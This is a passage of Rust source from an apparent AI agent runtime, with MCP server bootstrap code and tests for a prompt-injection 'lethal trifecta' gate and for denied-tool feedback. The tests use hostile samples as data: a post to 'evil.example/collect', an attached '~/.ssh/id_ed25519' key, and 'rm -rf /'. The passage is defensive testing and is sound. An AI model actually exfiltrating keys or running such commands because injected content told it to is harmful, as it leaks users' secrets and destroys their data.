            obj.insert("defer_loading".into(), serde_json::Value::Bool(true));
        }
    }
    tool
}

/// {tools_added, errors}.
#[harn_builtin(
    sig = "__host_mcp_bootstrap(session_id: string, specs?: list|nil) -> dict",
    kind = "async",
    category = "agent.host",
    runtime_only = true
)]
async fn host_mcp_bootstrap_impl(
    _ctx: crate::vm::AsyncBuiltinCtx,
    args: Vec<VmValue>,
) -> Result<VmValue, VmError> {
    use std::collections::BTreeMap;

    let session_id = match args.first() {
        Some(VmValue::String(s)) => s.to_string(),
        Some(other) => {
            return Err(VmError::Runtime(format!(
                "__host_mcp_bootstrap(session_id, specs): session_id must be a string; got {}",
                other.type_name()
            )))
        }
        None => {
            return Err(VmError::Runtime(
                "__host_mcp_bootstrap(session_id, specs): missing session_id".to_string(),
            ))
        }
    };

    let specs_val = args.get(1).cloned().unwrap_or(VmValue::Nil);
    let specs_list: Vec<serde_json::Value> = match &specs_val {
        VmValue::List(list) => list.iter().map(crate::mcp::vm_value_to_serde).collect(),
        VmValue::Nil => Vec::new(),
        other => {
            return Err(VmError::Runtime(format!(
                "__host_mcp_bootstrap(session_id, specs): specs must be a list; got {}",
                other.type_name()
            )))
        }
    };

    let mut clients: BTreeMap<String, crate::mcp::VmMcpClientHandle> =
        std::collections::BTreeMap::new();
    let mut tools_added: Vec<serde_json::Value> = Vec::new();
    let mut server_infos: Vec<serde_json::Value> = Vec::new();
    let mut errors: Vec<serde_json::Value> = Vec::new();

    for spec in &specs_list {
        let server_name = spec
            .get("name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        if server_name.is_empty() {
            errors.push(serde_json::json!({"error": "mcp_servers entry missing 'name'"}));
            continue;
        }

        // Progressive disclosure is the default (harn#2649): defer each
        // tool's schema until `tool_search`/dispatch reaches for it. A
        // spec can opt back into eager full schemas with
        // `eager_schemas: true`.
        let eager_schemas = spec
            .get("eager_schemas")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        match crate::mcp::connect_mcp_server_from_json(spec).await {
            Err(e) => {
                errors.push(serde_json::json!({
                    "server": server_name,
                    "error": e.to_string(),
                }));
            }
            Ok(handle) => {
                let initialize = handle
                    .initialize_result
                    .lock()
                    .await
                    .clone()
                    .unwrap_or(serde_json::Value::Null);
                let instructions = initialize
                    .get("instructions")
                    .or_else(|| {
                        initialize
                            .get("serverInfo")
                            .and_then(|value| value.get("instructions"))
                    })
                    .and_then(|value| value.as_str())
                    .unwrap_or("")
                    .to_string();
                server_infos.push(serde_json::json!({
                    "name": server_name.clone(),
                    "initialize": initialize,
                    "instructions": instructions,
                }));
                let list_result = handle.call("tools/list", serde_json::json!({})).await;
                match list_result {
                    Err(e) => {
                        errors.push(serde_json::json!({
                            "server": server_name,
                            "error": format!("tools/list failed: {e}"),
                        }));
                    }
                    Ok(result) => {
                        let raw_tools = result
                            .get("tools")
                            .and_then(|t| t.as_array())
                            .cloned()
                            .unwrap_or_default();
                        let mut mounted_tool_names: Vec<String> = Vec::new();
                        for tool in raw_tools {
                            let tagged = tag_mcp_tool(tool, &server_name, eager_schemas);
                            if let Some(name) = tagged.get("name").and_then(|v| v.as_str()) {
                                mounted_tool_names.push(name.to_string());
                            }
                            tools_added.push(tagged);
                        }
                        crate::tracing::emit_tool_mount(
                            &mounted_tool_names,
                            "mcp",
                            Some(&server_name),
                        );
                        clients.insert(server_name, handle);
                    }
                }
            }
        }
    }

    agent_runtime::install_session_mcp_clients(&session_id, clients);

    Ok(json_to_vm_value(&serde_json::json!({
        "tools_added": tools_added,
        "server_info": server_infos,
        "errors": errors,
    })))
}

/// Disconnect all MCP clients installed for session_id and remove them
/// from the session registry.
#[harn_builtin(
    sig = "__host_mcp_disconnect(session_id: string) -> bool",
    kind = "async",
    category = "agent.host",
    runtime_only = true
)]
async fn host_mcp_disconnect_impl(
    _ctx: crate::vm::AsyncBuiltinCtx,
    args: Vec<VmValue>,
) -> Result<VmValue, VmError> {
    let session_id = match args.first() {
        Some(VmValue::String(s)) => s.to_string(),
        Some(other) => {
            return Err(VmError::Runtime(format!(
                "__host_mcp_disconnect(session_id): session_id must be a string; got {}",
                other.type_name()
            )))
        }
        None => String::new(),
    };

    if !session_id.is_empty() {
        if let Some(clients) = agent_runtime::take_session_mcp_clients(&session_id) {
            for handle in clients.values() {
                let _ = handle.disconnect().await;
            }
        }
    }

    Ok(VmValue::Bool(true))
}

/// Evaluate registered reminder providers for an agent lifecycle event.
#[harn_builtin(
    sig = "__host_agent_reminder_providers_fire(session_id: string, event: string, payload?: dict|nil, options?: dict|nil) -> dict",
    kind = "async",
    category = "agent.host",
    runtime_only = true
)]
async fn host_agent_reminder_providers_fire_impl(
    ctx: crate::vm::AsyncBuiltinCtx,
    args: Vec<VmValue>,
) -> Result<VmValue, VmError> {
    let session_id = match args.first() {
        Some(VmValue::String(s)) if !s.trim().is_empty() => s.to_string(),
        Some(other) => {
            return Err(VmError::Runtime(format!(
                "__host_agent_reminder_providers_fire(session_id, event, payload?, options?): session_id must be a non-empty string; got {}",
                other.type_name()
            )))
        }
        None => {
            return Err(VmError::Runtime(
                "__host_agent_reminder_providers_fire(session_id, event, payload?, options?): missing session_id"
                    .to_string(),
            ))
        }
    };
    let event_name = match args.get(1) {
        Some(VmValue::String(s)) if !s.trim().is_empty() => s.to_string(),
        Some(other) => {
            return Err(VmError::Runtime(format!(
                "__host_agent_reminder_providers_fire: event must be a non-empty string; got {}",
                other.type_name()
            )))
        }
        None => {
            return Err(VmError::Runtime(
                "__host_agent_reminder_providers_fire: missing event".to_string(),
            ))
        }
    };
    let event =
        crate::orchestration::HookEvent::parse_provider_event(&event_name).map_err(|message| {
            VmError::Runtime(format!("__host_agent_reminder_providers_fire: {message}"))
        })?;
    let payload = args
        .get(2)
        .filter(|value| !matches!(value, VmValue::Nil))
        .map(helpers::vm_value_to_json)
        .unwrap_or_else(|| serde_json::json!({}));
    let options = agent_primitive_options_value_arg(
        args.get(3).cloned(),
        "__host_agent_reminder_providers_fire",
    )?;
    let report = super::reminder_providers::evaluate_and_inject(
        Some(&ctx),
        event,
        &session_id,
        payload,
        super::reminder_providers::options_map_to_json(&options),
    )
    .await?;
    Ok(json_to_vm_value(&report))
}

#[cfg(test)]
mod security_gate_tests {
    use super::{tool_descriptor_for, trifecta_gate_reason, upgrade_to_trifecta_ask};
    use crate::value::VmValue;

    use std::sync::Arc;

    fn allow_decision() -> crate::orchestration::PolicyEvaluation {
        crate::orchestration::PolicyEvaluation {
            action: "allow".to_string(),
            reason: "auto-approved".to_string(),
            matched_rule: None,
            required_approval: None,
            risk_labels: Vec::new(),
            receipt: serde_json::json!({
                "type": "policy_decision",
                "action": "allow",
                "reason": "auto-approved",
                "risk_labels": [],
            }),
        }
    }

    #[test]
    fn trifecta_upgrade_syncs_decision_and_receipt() {
        let mut decision = allow_decision();
        upgrade_to_trifecta_ask(
            &mut decision,
            "untrusted content + exfil tool".to_string(),
            &[],
        );

        assert_eq!(decision.action, "ask");
        assert_eq!(decision.reason, "untrusted content + exfil tool");
        assert!(decision.risk_labels.iter().any(|l| l == "lethal_trifecta"));

        // The audit receipt (sent to the host as `policyDecision`) must agree
        // with the upgraded decision so the approval UI can surface the reason.
        assert_eq!(decision.receipt["action"], "ask");
        assert_eq!(decision.receipt["reason"], "untrusted content + exfil tool");
        assert_eq!(decision.receipt["risk_labels"][0], "lethal_trifecta");
    }

    #[test]
    fn trifecta_upgrade_does_not_duplicate_label() {
        let mut decision = allow_decision();
        decision.risk_labels.push("lethal_trifecta".to_string());
        upgrade_to_trifecta_ask(&mut decision, "reason".to_string(), &[]);
        let count = decision
            .risk_labels
            .iter()
            .filter(|l| *l == "lethal_trifecta")
            .count();
        assert_eq!(count, 1);
    }

    #[test]
    fn trifecta_upgrade_adds_extra_labels_without_dropping_trifecta() {
        let mut decision = allow_decision();
        upgrade_to_trifecta_ask(
            &mut decision,
            "flagged injection + write tool".to_string(),
            &["prompt_injection"],
        );
        assert!(decision.risk_labels.iter().any(|l| l == "lethal_trifecta"));
        assert!(decision.risk_labels.iter().any(|l| l == "prompt_injection"));
        // Receipt mirrors the labels for the host/UI.
        let labels = decision.receipt["risk_labels"]
            .as_array()
            .expect("risk_labels array");
        assert!(labels.iter().any(|l| l == "prompt_injection"));
    }

    #[test]
    fn flagged_injection_plus_write_tool_gates_via_detection_axis() {
        use crate::config::{SecurityConfig, SecurityMode};
        use crate::security::{DetectorVerdict, SecurityPolicy, TaintRecord, TrustLevel};
        use crate::tool_annotations::{SideEffectLevel, ToolAnnotations};

        let policy = SecurityPolicy::from_config(&SecurityConfig {
            mode: SecurityMode::LocalMl,
            ..Default::default()
        });
        assert!(policy.detect_injection, "local-ml enables detection");

        let write_ann = ToolAnnotations {
            side_effect_level: SideEffectLevel::WorkspaceWrite,
            ..Default::default()
        };
        let taint = |flagged: bool, score: f64| {
            vec![TaintRecord {
                origin: "fetch:web_fetch".to_string(),
                trust: TrustLevel::Untrusted,
                introduced_by: "call-1".to_string(),
                detector: Some(DetectorVerdict {
                    model: "heuristic-v1".to_string(),
                    score,
                    flagged,
                }),
                labels: Vec::new(),
                endpoints: Vec::new(),
            }]
        };

        // Flagged injection + a workspace-write tool trips the detection axis.
        let outcome = trifecta_gate_reason(
            &policy,
            Some(&write_ann),
            "write_file",
            &serde_json::json!({}),
            &taint(true, 0.85),
        )
        .expect("detection axis fires");
        assert!(outcome.injection_flagged);
        assert!(
            outcome.reason.contains("85% confidence"),
            "{}",
            outcome.reason
        );
        assert!(outcome.reason.contains("modifies workspace files"));

        // A benign (not-flagged) verdict does NOT gate a workspace write.
        assert!(
            trifecta_gate_reason(
                &policy,
                Some(&write_ann),
                "write_file",
                &serde_json::json!({}),
                &taint(false, 0.10),
            )
            .is_none(),
            "unflagged content must not gate benign writes"
        );
    }

    #[test]
    fn mounted_untrusted_server_data_cannot_reach_an_egress_sink_ungated() {
        // Part #3 (quarantine): an untrusted mounted-MCP-server result in
        // context plus an exfil-capable tool trips the lethal-trifecta gate.
        // This is already covered by the substrate; the test proves it holds.
        use crate::config::SecurityConfig;
        use crate::security::{SecurityPolicy, TaintRecord, TrustLevel};
        use crate::tool_annotations::{SideEffectLevel, ToolAnnotations};

        let policy = SecurityPolicy::from_config(&SecurityConfig::default());
        let mounted_untrusted = vec![TaintRecord {
            // `classify_result_trust` tags a mounted server's result
            // `mcp:{server}` Untrusted (see `security::tests`); the same origin
            // reaches the gate here.
            origin: "mcp:untrusted-connector".to_string(),
            trust: TrustLevel::Untrusted,
            introduced_by: "call-mount-1".to_string(),
            detector: None,
            labels: Vec::new(),
            endpoints: Vec::new(),
        }];
        let egress = ToolAnnotations {
            side_effect_level: SideEffectLevel::Network,
            ..Default::default()
        };
        let outcome = trifecta_gate_reason(
            &policy,
            Some(&egress),
            "http_post",
            &serde_json::json!({}),
            &mounted_untrusted,
        )
        .expect("untrusted mounted-server data + egress tool must gate");
        assert!(outcome.reason.contains("mcp:untrusted-connector"));
        assert!(outcome.reason.contains("external destination"));

        // The gate is sink-specific: the same untrusted taint plus a read-only,
        // non-egress tool does NOT gate — quarantine fires only at a real
        // lethal-trifecta sink, not on every tool while tainted.
        assert!(
            trifecta_gate_reason(
                &policy,
                Some(&ToolAnnotations::default()),
                "read_file",
                &serde_json::json!({"path": "src/main.rs"}),
                &mounted_untrusted,
            )
            .is_none(),
            "untrusted taint + a non-sink read tool must not gate"
        );
    }

    #[test]
    fn precise_exfil_gate_narrows_to_attacker_named_destinations() {
        // Precise mode makes the exfil axis fire on the real attack signature —
        // the untrusted content controls the destination — instead of on any
        // exfil-capable tool while any untrusted content is in context. This is
        // what keeps benign research/synthesis to a user-named sink quiet.
        use crate::config::SecurityConfig;
        use crate::security::{SecurityPolicy, TaintRecord, TrustLevel};
        use crate::tool_annotations::{SideEffectLevel, ToolAnnotations};

        let precise = SecurityPolicy::from_config(&SecurityConfig {
            precise_exfil_gate: true,
            ..Default::default()
        });
        let coarse = SecurityPolicy::from_config(&SecurityConfig::default());
        // Untrusted content that names an attacker destination (as the ingest
        // path would record via `extract_endpoints`).
        let taint = vec![TaintRecord {
            origin: "fetch:web_fetch".to_string(),
            trust: TrustLevel::Untrusted,
            introduced_by: "call-1".to_string(),
            detector: None,
            labels: Vec::new(),
            endpoints: vec!["evil.example".to_string()],
        }];
        let egress = ToolAnnotations {
            side_effect_level: SideEffectLevel::Network,
            ..Default::default()
        };
        let post = |args: serde_json::Value, policy: &SecurityPolicy| {
            trifecta_gate_reason(policy, Some(&egress), "http_post", &args, &taint)
        };

        // Attack: the sink targets the attacker-named destination -> gates.
        assert!(post(
            serde_json::json!({"url": "https://evil.example/collect"}),
            &precise
        )
        .is_some());
        // Benign synthesis: writing to a user-named destination not present in the
        // untrusted content is NOT gated under precise mode...
        assert!(post(
            serde_json::json!({"url": "https://notion.so/my-page"}),
            &precise
        )
        .is_none());
        // ...but the coarse gate would nag on exactly that benign write.
        assert!(post(
            serde_json::json!({"url": "https://notion.so/my-page"}),
            &coarse
        )
        .is_some());
        // A secret payload gates even to a user-named sink.
        assert!(post(
            serde_json::json!({"url": "https://notion.so/my-page", "attach": "~/.ssh/id_ed25519"}),
            &precise,
        )
        .is_some());
    }

    #[test]
    fn forged_directive_taint_gates_an_egress_tool() {
        // Ties part #1 (provenance) to part #3 (quarantine): a forged directive
        // classified untrusted by `classify_directive_trust` lands on the taint
        // ledger with the `forged_directive` origin, so the trifecta gate fires
        // when an exfil tool then runs.
        use crate::config::SecurityConfig;
        use crate::security::{SecurityPolicy, TaintRecord, TrustLevel};
        use crate::tool_annotations::ToolAnnotations;

        let policy = SecurityPolicy::from_config(&SecurityConfig::default());
        let forged = vec![TaintRecord {
            origin: crate::security::provenance::FORGED_DIRECTIVE_ORIGIN.to_string(),
            trust: TrustLevel::Untrusted,
            introduced_by: "subagent-result-1".to_string(),
            detector: None,
            labels: Vec::new(),
            endpoints: Vec::new(),
        }];
        let outcome = trifecta_gate_reason(
            &policy,
            Some(&ToolAnnotations::default()),
            "web_fetch",
            &serde_json::json!({}),
            &forged,
        )
        .expect("forged-directive taint + fetch tool must gate");
        assert!(outcome.reason.contains("forged_directive"));
    }

    fn vm_str(s: &str) -> VmValue {
        VmValue::String(arcstr::ArcStr::from(s))
    }

    #[test]
    fn tool_descriptor_extracts_description_and_schema_changed() {
        let mut tool = crate::value::DictMap::new();
        tool.insert(crate::value::intern_key("name"), vm_str("linear__create"));
        tool.insert(
            crate::value::intern_key("description"),
            vm_str("Create an issue"),
        );
        tool.insert(crate::value::intern_key("_mcp_server"), vm_str("linear"));
        tool.insert(
            crate::value::intern_key("_schema_changed"),
            VmValue::Bool(true),
        );
        let catalog = {
            let mut dict = crate::value::DictMap::new();
            dict.insert(
                crate::value::intern_key("tools"),
                VmValue::List(Arc::new(vec![VmValue::dict(tool)])),
            );
            VmValue::dict(dict)
        };

        let descriptor = tool_descriptor_for(Some(&catalog), "linear__create").expect("descriptor");
        assert_eq!(descriptor["description"], "Create an issue");
        assert_eq!(descriptor["mcpServer"], "linear");
        assert_eq!(descriptor["schemaChanged"], true);

        assert!(tool_descriptor_for(Some(&catalog), "unknown_tool").is_none());
    }
}

#[cfg(test)]
mod denied_tool_routing_tests {
    //! `agent_primitive_denied_tool` must pick its model-facing result body by
    //! category: RECOVERABLE rejections (schema/argument validation, malformed
    //! tool name) coach a retry-with-correction, while TRUE policy/permission
    //! denials keep the don't-retry body. Reverting the split (sending every
    //! category through `denied_tool_result`) fails the recoverable assertions.
    use super::{agent_primitive_denied_tool, deny_tool_call};
    use crate::agent_events::ToolCallErrorCategory;

    #[test]
    fn schema_validation_missing_param_yields_invalid_arguments_retry_positive() {
        let envelope = agent_primitive_denied_tool(
            "edit",
            "call_1",
            &serde_json::json!({ "content": "x" }),
            "Tool 'edit' is missing required parameter(s): path. \
             Provide all required parameters and try again.",
            ToolCallErrorCategory::SchemaValidation,
            None,
            None,
        );
        // Envelope-level category is still schema_validation for the wire...
        assert_eq!(envelope["error_category"], "schema_validation");
        // ...but the inner model-facing result is retry-positive, NOT a denial.
        let result = &envelope["result"];
        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
        assert_ne!(result["error"], serde_json::json!("permission_denied"));
        let observation = envelope["observation"]
            .as_str()
            .expect("recoverable rejection should carry model-facing observation");
        assert!(
            observation.starts_with("[result of edit]\n") && observation.contains("[end of edit result]"),
            "recoverable argument rejection must use normal tool-result framing, got: {observation}"
        );
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            !next.contains("Do not retry"),
            "schema rejection must be retry-positive: {next}"
        );
        assert!(
            next.contains("Re-call") && next.contains("edit") && next.contains("path"),
            "next_step should re-call the named tool with the missing param: {next}"
        );
    }

    #[test]
    fn empty_tool_name_yields_recoverable_retry_positive_feedback() {
        let envelope = agent_primitive_denied_tool(
            "<unnamed>",
            "call_2",
            &serde_json::json!({}),
            "Tool call is missing a name. Emit one tool call per turn as \
             `name({ ... })` using a non-empty tool name from the allowed list, then retry.",
            ToolCallErrorCategory::SchemaValidation,
            None,
            None,
        );
        let result = &envelope["result"];
        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            !next.contains("Do not retry"),
            "empty-name slip must be retry-positive: {next}"
        );
    }

    #[test]
    fn retryable_arg_constraint_denial_is_coached_as_recoverable() {
        use crate::agent_events::{DenialGate, ToolDenial};
        // A sub-agent scoped to `test/users.*` that tried to edit the shared
        // reference file: the tool is permitted, only this path is out of scope.
        let denial = ToolDenial::retryable(
            DenialGate::ArgConstraint,
            None,
            "tool 'edit' path 'test/accounts.integration.test.ts' is outside your allowed \
             scope. Allowed path pattern(s): [\"test/users.*\"]. This is fixable: re-issue \
             the call with a path that matches one of those patterns.",
        );
        let envelope = agent_primitive_denied_tool(
            "edit",
            "call_3",
            &serde_json::json!({ "path": "test/accounts.integration.test.ts" }),
            denial.reason.clone(),
            ToolCallErrorCategory::PermissionDenied,
            Some(&denial),
            None,
        );
        let result = &envelope["result"];
        // Retry-positive body, NOT a hard permission denial.
        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
        assert_ne!(result["error"], serde_json::json!("permission_denied"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            !next.contains("Do not retry"),
            "retryable arg-scope denial must coach a correction, not give-up: {next}"
        );
        // The structured denial still records the precise gate + retryable flag.
        assert_eq!(envelope["denial"]["gate"], "arg_constraint");
        assert_eq!(envelope["denial"]["retryable"], true);
    }

    #[test]
    fn tool_call_wrapper_ceiling_denial_yields_embedded_call_repair() {
        use crate::agent_events::{DenialGate, ToolDenial};
        // Live headless pathology: the model emitted a native call NAMED
        // `tool_call` whose arguments carried a correct text-format call. The
        // ceiling denial must come back as parse-repair feedback that names
        // the embedded call — never permission vocabulary the model answers
        // by petitioning a user that does not exist.
        use crate::orchestration::{pop_execution_policy, push_execution_policy, CapabilityPolicy};
        let denial = ToolDenial::terminal(
            DenialGate::ToolCeiling,
            None,
            "tool 'tool_call' exceeds tool ceiling",
        );
        // A ToolCeiling denial implies an active policy with a non-empty tool
        // allowlist — mirror that precondition so the embedded call validates.
        push_execution_policy(CapabilityPolicy {
            tools: vec!["look".to_string(), "search".to_string(), "edit".to_string()],
            ..Default::default()
        });
        let envelope = deny_tool_call(
            "",
            "tool_call",
            "call_8",
            &serde_json::json!(
                "<tool_call>\nlook({ file: \"src/main.rs\", intent: \"read\" })\n</tool_call>"
            ),
            denial,
            false,
            None,
            None,
        );
        pop_execution_policy();
        let result = &envelope["result"];
        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            next.contains("look(") && next.contains("src/main.rs"),
            "repair must show the corrected direct invocation: {next}"
        );
        assert!(
            !next.to_lowercase().contains("permission") && !next.contains("Do not retry"),
            "repair must be retry-positive with no permission framing: {next}"
        );
        // The structured denial names the wrapper-syntax cause instead of the
        // lower-level policy gate and flips retryable: re-issuing WITH the
        // correction is exactly the coached next move.
        assert_eq!(envelope["denial"]["gate"], "malformed_tool_wrapper");
        assert_eq!(envelope["denial"]["retryable"], true);
        assert_eq!(result["denial"]["gate"], "malformed_tool_wrapper");
        assert_eq!(result["denial"]["retryable"], true);
        assert_eq!(envelope["denial"]["reason"], result["reason"]);
        assert_eq!(result["denial"]["reason"], result["reason"]);
        assert_eq!(envelope["error"], result["reason"]);
        // The wire-level category is unchanged for host harnesses.
        assert_eq!(envelope["error_category"], "permission_denied");
    }

    #[test]
    fn unknown_tool_ceiling_denial_drops_permission_framing() {
        use crate::agent_events::{DenialGate, ToolDenial};
        // A plain unknown/excluded name (no embedded call to repair) gets the
        // action-oriented unavailable-tool body: name the failure class, steer
        // off a re-send — never "what you need permission for".
        let denial = ToolDenial::terminal(
            DenialGate::ToolCeiling,
            None,
            "tool 'repo_browser.bundle' exceeds tool ceiling",
        );
        let envelope = agent_primitive_denied_tool(
            "repo_browser.bundle",
            "call_9",
            &serde_json::json!({ "path": "src" }),
            denial.reason.clone(),
            ToolCallErrorCategory::PermissionDenied,
            Some(&denial),
            None,
        );
        let result = &envelope["result"];
        assert_eq!(result["error"], serde_json::json!("unknown_tool"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            !next.to_lowercase().contains("permission") && !next.contains("not permitted"),
            "name-resolution denial must not use permission framing: {next}"
        );
        assert!(
            next.contains("not one of the available tools"),
            "next_step should name the failure class: {next}"
        );
        // Still terminal: re-sending the identical call can never succeed.
        assert_eq!(envelope["denial"]["gate"], "tool_ceiling");
        assert_eq!(envelope["denial"]["retryable"], false);
        assert_eq!(envelope["error_category"], "permission_denied");
    }

    #[test]
    fn hard_capability_denial_stays_terminal() {
        use crate::agent_events::{DenialGate, ToolDenial};
        let denial = ToolDenial::terminal(
            DenialGate::CapabilityCeiling,
            Some("workspace.write_text".to_string()),
            "tool 'edit' exceeds capability ceiling: workspace.write_text",
        );
        let envelope = agent_primitive_denied_tool(
            "edit",
            "call_4",
            &serde_json::json!({ "path": "x" }),
            denial.reason.clone(),
            ToolCallErrorCategory::PermissionDenied,
            Some(&denial),
            None,
        );
        let result = &envelope["result"];
        assert_eq!(result["error"], serde_json::json!("permission_denied"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            next.contains("Do not retry"),
            "a hard capability ceiling must stay terminal: {next}"
        );
    }

    #[test]
    fn arg_scoped_dynamic_permission_denial_is_coached_as_recoverable() {
        use crate::agent_events::{DenialGate, ToolDenial};
        // A dynamic permission rule denied a specific path while the tool itself
        // is permitted (analogous to ArgConstraint): coach a retry with an
        // allowed value rather than a terminal "do not retry".
        let denial = ToolDenial::retryable(
            DenialGate::DynamicPermission,
            None,
            "permission denied: path 'docs/secret.md' is outside custom path scope",
        );
        let envelope = agent_primitive_denied_tool(
            "edit",
            "call_5",
            &serde_json::json!({ "path": "docs/secret.md" }),
            denial.reason.clone(),
            ToolCallErrorCategory::PermissionDenied,
            Some(&denial),
            None,
        );
        let result = &envelope["result"];
        // Retry-positive body, NOT a hard permission denial.
        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
        assert_ne!(result["error"], serde_json::json!("permission_denied"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            !next.contains("Do not retry"),
            "arg-scoped dynamic-permission denial must coach a correction: {next}"
        );
        assert_eq!(envelope["denial"]["gate"], "dynamic_permission");
        assert_eq!(envelope["denial"]["retryable"], true);
    }

    #[test]
    fn hard_dynamic_permission_ceiling_stays_terminal() {
        use crate::agent_events::{DenialGate, ToolDenial};
        // The whole tool is denied by the dynamic policy: a retry can't help.
        let denial = ToolDenial::terminal(
            DenialGate::DynamicPermission,
            None,
            "permission denied: tool 'exec' is not allowed by this agent's permissions",
        );
        let envelope = agent_primitive_denied_tool(
            "exec",
            "call_6",
            &serde_json::json!({ "command": "rm -rf /" }),
            denial.reason.clone(),
            ToolCallErrorCategory::PermissionDenied,
            Some(&denial),
            None,
        );
        let result = &envelope["result"];
        assert_eq!(result["error"], serde_json::json!("permission_denied"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
            next.contains("Do not retry"),
            "a hard dynamic-permission ceiling must stay terminal: {next}"
        );
        assert_eq!(envelope["denial"]["retryable"], false);
    }

    #[test]
    fn approval_unavailable_and_host_rejected_stay_terminal() {
        use crate::agent_events::{DenialGate, ToolDenial};
        // ApprovalUnavailable means no approver exists; HostRejected means the
        // user said no. A retry yields the same result, so both stay terminal
        // and are never marked recoverable.
        for gate in [DenialGate::ApprovalUnavailable, DenialGate::HostRejected] {
            let denial = ToolDenial::terminal(gate, None, "approval refused");
            assert!(!denial.retryable, "{} must stay terminal", gate.as_str());
            let envelope = agent_primitive_denied_tool(
                "exec",
                "call_7",
                &serde_json::json!({ "command": "ls" }),
                denial.reason.clone(),
                ToolCallErrorCategory::PermissionDenied,
                Some(&denial),
                None,
            );
            let result = &envelope["result"];
            assert_eq!(result["error"], serde_json::json!("permission_denied"));
            let next = result["next_step"].as_str().expect("next_step");
            assert!(
                next.contains("Do not retry"),
                "{} must stay terminal: {next}",
                gate.as_str()
            );
        }
    }

    use super::arg_delivery_fault_feedback;

    #[test]
    fn empty_args_with_length_truncation_names_the_truncation_cause() {
        let (reason, cause) =
            arg_delivery_fault_feedback("edit", &serde_json::json!({}), Some("length"))
                .expect("empty args must be cause-named");
        assert_eq!(cause, "empty_arguments_truncated");
        assert!(
            reason.contains("TRUNCATED") && reason.contains("output"),
            "length-truncated empty args must name the output-limit cut: {reason}"
        );
        assert!(
            reason.contains("shorter") || reason.contains("split"),
            "truncation feedback must coach a smaller re-issue: {reason}"
        );
        assert!(
            !reason.contains("missing required parameter"),
            "must not misdiagnose as a missing-parameter slip: {reason}"
        );
        // Anthropic spelling and provider casing route to the same cause.
        let (_, cause) =
            arg_delivery_fault_feedback("edit", &serde_json::Value::Null, Some("MAX_TOKENS"))
                .expect("null args must be cause-named");
        assert_eq!(cause, "empty_arguments_truncated");
    }

    #[test]
    fn empty_args_with_clean_stop_names_the_provider_fault_cause() {
        for stop_reason in [Some("stop"), Some("tool_calls"), None] {
            let (reason, cause) =
                arg_delivery_fault_feedback("edit", &serde_json::json!({}), stop_reason)
                    .expect("empty args must be cause-named");
            assert_eq!(cause, "empty_arguments_dropped");
            assert!(
                reason.contains("EMPTY arguments") && reason.contains("provider"),
                "clean-stop empty args must name the provider fault: {reason}"
            );
            assert!(
                reason.contains("Re-issue the same call"),
                "provider-fault feedback must coach an identical re-issue: {reason}"
            );
        }
    }

    // REAL captured bytes from a live llamacpp qwen3.6-35b turn
    // (burin-examples/swift conversation 1b42844f): the model authored an
    // `edit(action=create, content=<large file>)` call whose native
    // `function.arguments` stream was cut mid-`content`, so the streamed-arg
    // parser handed dispatch a `{"__parse_error": "..."}` carrier. Validation
    // then reported "missing required parameter: path" and the model, told to
    // "re-call with path" (which it HAD supplied), re-issued the same oversized
    // edit and truncated again — 21 llm calls, 28 failed tool calls, idle with
    // no visible reply. The carrier must be named as a truncation, not a slip.
    const CAPTURED_TRUNCATION_CARRIER: &str = "Could not parse streamed tool arguments as JSON \
        or Harn text-tool arguments: JSON error: EOF while parsing a value at line 1 column 1401; \
        Harn text-tool error: TOOL CALL PARSE ERROR: `edit{...}` — unexpected end of input. Tool \
        arguments must be a TypeScript object literal. Raw: {\"path\":\"Sources/SysMonCore/\
        Providers/LiveSystemProvider.swift\",\"action\":\"create\",\"content\":\"import Foundation";

    #[test]
    fn truncated_toolcall_carrier_names_the_truncation_not_a_missing_param() {
        let carrier = serde_json::json!({ "__parse_error": CAPTURED_TRUNCATION_CARRIER });
        let (reason, cause) = arg_delivery_fault_feedback("edit", &carrier, Some("tool_calls"))
            .expect("a __parse_error carrier must be cause-named, not left to the validator");
        assert_eq!(cause, "arguments_truncated");
        assert!(
            reason.contains("TRUNCATED") || reason.contains("cut off"),
            "the carrier must be named as a truncated call: {reason}"
        );
        assert!(
            reason.contains("shorter") || reason.contains("split") || reason.contains("smaller"),
            "truncation feedback must coach a smaller re-issue: {reason}"
        );
        assert!(
            !reason.contains("missing required parameter"),
            "must NOT repeat the misdiagnosing missing-parameter message: {reason}"
        );
    }

    #[test]
    fn malformed_toolcall_carrier_stays_a_clean_parse_error() {
        // A genuinely malformed (non-truncation) carrier must NOT be silently
        // accepted or mislabeled as a truncation — it stays a clean parse error
        // coaching valid JSON. Negative control against over-permissive repair.
        let carrier = serde_json::json!({
            "__parse_error": "Could not parse streamed tool arguments as JSON or Harn \
                text-tool arguments: JSON error: key must be a string at line 1 column 5. \
                Raw input: {path: not-json @#$}"
        });
        let (reason, cause) = arg_delivery_fault_feedback("edit", &carrier, None)
            .expect("a malformed carrier is still a named parse fault");
        assert_eq!(cause, "arguments_malformed");
        assert!(
            !reason.contains("TRUNCATED"),
            "a non-EOF parse error must not be labeled a truncation: {reason}"
        );
        assert!(
            reason.contains("JSON"),
            "malformed feedback must coach valid JSON: {reason}"
        );
    }

    #[test]
    fn non_empty_args_keep_the_precise_validator_message() {
        assert!(
            arg_delivery_fault_feedback(
                "edit",
                &serde_json::json!({ "content": "x" }),
                Some("length")
            )
            .is_none(),
            "a call that DID deliver arguments must keep the missing-parameter message"
        );
    }

    #[test]
    fn permission_denied_keeps_do_not_retry_body() {
        let envelope = agent_primitive_denied_tool(
            "run",
            "call_3",
            &serde_json::json!({ "command": "rm -rf /" }),
            "shell access is disabled by policy",
            ToolCallErrorCategory::PermissionDenied,
            None,
            None,
        );
        assert_eq!(envelope["error_category"], "permission_denied");
        let result = &envelope["result"];
        assert_eq!(result["error"], serde_json::json!("permission_denied"));
        let next = result["next_step"].as_str().expect("next_step");
        assert!(
